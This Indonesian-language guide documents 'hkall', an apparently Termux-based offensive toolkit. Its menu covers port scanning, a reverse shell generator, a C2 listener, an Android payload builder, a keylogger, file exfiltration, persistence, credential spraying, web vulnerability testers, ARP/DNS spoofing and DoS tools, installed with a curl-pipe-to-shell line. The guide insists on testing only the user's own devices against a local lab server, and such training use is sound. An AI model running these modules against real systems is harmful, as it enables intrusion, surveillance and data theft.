# hkall — Panduan Lengkap (Menu → Input → Auto)

Semua modul: **uji device/network milik sendiri saja.** Lab server tersedia di `lab/lab_server.py`.
Alur umum (TUI): `hkall` → menu numbered → pilih modul → jawab prompt → hasil tersimpan ke `data/rs.db`
`hkall -m history` untuk lihat.

---

## 0. Global `hkall` command + lab

```bash
# 1x install global (Termux: pkg install; lain: cukup python3)
curl -sL https://github.com/rizqiwidi/hkall/raw/master/install.sh | sh
# atau ikut langkah manual di README

hkall                # TUI menu
hkall -m scan -h     # per-module flags help
hkall --list         # semua modul (29 + plugin)
hkall --search sql   # filter

# lab server (target latihan, di device sendiri, bind 127.0.0.1)
python3 lab/lab_server.py 8090

# completion (sekali, di ~/.bashrc / ~/.zshrc)
source $HOME/hkall/bin/hkall-completion.bash
```

TUI: `/query` filter, `i N` info modul, `N` jalankan, `0`/`q` keluar.

---

## A. Modul bawaan (`hkall.py`) — 20 modul

### recon
| modul | fungsi | contoh |
|-------|--------|--------|
| scan | port scanner + banner | `hkall -m scan --host 127.0.0.1 --ports 1-1000` |
| enum | web enumerator (header/mail/secret/form) | `hkall -m enum --host http://127.0.0.1:8090` |
| whois | DNS lookup | `hkall -m whois --host example.com` |
| subd | subdomain brute | `hkall -m subd --host example.com` |
| lan | LAN host discoverer | `hkall -m lan --host 192.168.1.0/24` |
| arp | ARP scan (root) | `hkall -m arp --host 192.168.1.0/24` |

### shells
| modul | fungsi | contoh |
|-------|--------|--------|
| shell | reverse shell generator | `hkall -m shell --host 192.168.1.5 --port 4444` |
| c2 | C2 listener multi-session | `hkall -m c2 --port 4444` |
| payload | Android payload builder | `hkall -m payload --host 1.2.3.4 --port 8443` |
| exe2 | shell payload variants | `hkall -m exe2 --host 1.2.3.4 --port 4444` |
| keylog | keylogger | `hkall -m keylog` |

### exfil
| modul | fungsi | contoh |
|-------|--------|--------|
| exfil | kirim file | `hkall -m exfil --host 192.168.1.5 --port 12345 --file a.txt` |
| recv | terima file | `hkall -m recv --port 12345` |

### device / misc
| modul | fungsi | contoh |
|-------|--------|--------|
| wifi | wifi audit (termux-api) | `hkall -m wifi` |
| persist | persistence boot+hook | `hkall -m persist` |
| ops | device ops (termux-api) | `hkall -m ops` |
| serve | HTTP static server | `hkall -m serve` |
| spray | web form credential spray | `hkall -m spray --host http://127.0.0.1:8090` |
| cfg | config/preset | `hkall -m cfg` |
| history | hasil tersimpan | `hkall -m history --limit 10 --kind scan` |

---

## B. Modul plugin `websec` — 8 modul (lab)

Semua uji **device sendiri** (pakai `lab/lab_server.py`).

| modul | fungsi | contoh (CLI one-shot) |
|-------|--------|----------------------|
| sqli | SQLi tester (16 payload) | `hkall -m sqli --host "http://127.0.0.1:8090/sqli?x=1"` |
| xss | XSS reflection check | `hkall -m xss --host "http://127.0.0.1:8090/xss?q="` |
| csrf | CSRF check (SameSite+token) | `hkall -m csrf --host http://127.0.0.1:8090/act` |
| idor | IDOR enumeration | `hkall -m idor --host "http://127.0.0.1:8090/user/{{id}}" --range 20 --auth "Bearer x"` |
| mitm | ARP MITM lab (root) | `hkall -m mitm --host 192.168.1.50 --gateway 192.168.1.1 --iface wlan0` |
| dnsspoof | DNS spoof lab (root) | `hkall -m dnsspoof --domain test.lab --ip 127.0.0.1` |
| ddos | load test (bounded) | `hkall -m ddos --host http://127.0.0.1:8090/load` |
| websec | orchestrator menu (chain) | `hkall -m websec` |

### websec orchestrator
```
hkall -m websec
  [category] 1=web 2=network 3=load
  [web] a=sqli b=xss c=csrf d=idor, atau "auto" (chain a→b→c→d)
  [target] url device sendiri
```

---

## C. Modul plugin `toolbox` — eksternal tool (18 tool)

`hkall -m toolbox` → menu kategori → pilih tool → kalau binary belum ada, tawarkan `pkg install`
(dengan cek repo, konfirmasi dulu). Katalog: `tools.json`.

| kategori | tool | fungsi | root |
|----------|------|--------|------|
| web | sqlmap | SQLi auto | tidak |
| web | ffuf | web fuzz (path/param) | tidak |
| web | mitmproxy | HTTPS MITM proxy (CA di device sendiri) | transparent mode |
| net | bettercap | MITM framework (arp/dns/sslstrip) | ya |
| net | dnschef | fake DNS proxy (pip) | ya |
| net | tcpdump | packet capture | ya |
| net | tshark | packet analysis | ya |
| net | hping3 | packet crafting/flood (lab) | ya |
| net | dnsmasq | fake DNS via hosts | tidak (pakai -p 5353) |
| net | dsniff | arpspoof/dnsspoof/macof | ya |
| net | macchanger | MAC spoof | ya |
| recon | nmap | port/service scan | tidak |
| auth | hydra | login brute (own service) | tidak |
| load | ab | ApacheBench | tidak |
| load | siege | load test | tidak |
| load | wrk | HTTP benchmark | tidak |
| load | goldeneye | HTTP DoS (lab-only) | tidak |

Status terpasang device ini: `tshark`, `mitmdump` (mitmproxy). Sisanya offer install saat dipilih.
Contoh pakai toolbox:
```
hkall -m toolbox
  > 1 (web)  > 1 (sqlmap)  > install? [n/y]
  > target url (device) ...
  > apakah sudah install? kalau belum, jawab y
```

---

## D. Alur belajar lengkap (device sendiri)

1. Nyalakan lab:
   ```
   python3 lab/lab_server.py 8090
   ```
2. Satu per satu (lihat tabel B), atau sekaligus:
   ```
   hkall -m sqli  --host "http://127.0.0.1:8090/sqli?x=1"
   hkall -m xss   --host "http://127.0.0.1:8090/xss?q="
   hkall -m csrf  --host "http://127.0.0.1:8090/act"
   hkall -m idor  --host "http://127.0.0.1:8090/user/{{id}}" --range 5
   hkall -m ddos  --host "http://127.0.0.1:8090/load"
   ```
3. Cek hasil:
   ```
   hkall -m history --limit 20
   ```

Hasil yang diharapkan (lab server vuln):
- sqli → banyak `[check]` status 500 vs 200
- xss → `reflected raw: [<script>alert(1)</script>, ...]` (6 payload reflected)
- csrf → `verdict: review` (no SameSite, no token)
- idor → `accessible ids: [(1,200),(2,200),(3,200)]` (4-5 404)
- ddos → `done in ~10s: ... req/s`

---

## E. Struktur menu

| kategori | modul |
|----------|-------|
| recon | scan, enum, whois, subd, lan, arp, nmap(toolbox) |
| shells | shell, c2, payload, exe2, keylog |
| exfil | exfil, recv |
| web vuln | sqli, xss, csrf, idor, spray, ffuf(toolbox), sqlmap(toolbox) |
| network attack | mitm, dnsspoof, bettercap, dnschef, dnsmasq, dsniff, hping3 |
| load test | ddos, ab, siege, wrk, goldeneye |
| misc | wifi, persist, ops, serve, cfg, history, websec, toolbox |

Batas aman tetap: semua target device sendiri, mitm/dnsspoof butuh root + restore otomatis.
